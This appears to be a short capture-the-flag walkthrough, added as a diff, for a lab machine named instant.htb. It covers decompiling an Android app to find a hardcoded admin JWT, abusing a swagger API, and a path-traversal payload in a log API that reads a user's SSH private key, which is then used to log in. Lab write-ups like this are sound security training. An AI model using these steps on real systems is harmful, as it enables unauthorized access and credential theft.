@@ -1,0 +1,14 @@
+download apk file from website
+jadx -d <output directory> <absolute path to file>
+grep -Roi [a-b0-9\<\>].*\.instant.htb <output directory> : Check subdomains -> swagger-ui, mywalletv1
+http://swagger-ui.instant.htb : Get apis -> register -> login : returns jwt -> Authorize using jwt
+** echo -n <jwt> | base64 -d : Shows json
+** Or go to jwt.io and paste
+
+Check <output directory>/sources/com/instantlabs/instant/AdminActivities.java
+- TestAdminAuthorization .addHeader(<jwt for admin>) : copy admin jwt
+Authorize using new jwt -> list user api possible
+burpsuite - read log api packet
+log_file_name=../../../../../..//home/shirohige/.ssh/id_rsa : get private key
+chmod 600 <private_key>
+ssh -i <private key> shirohige@<ip>
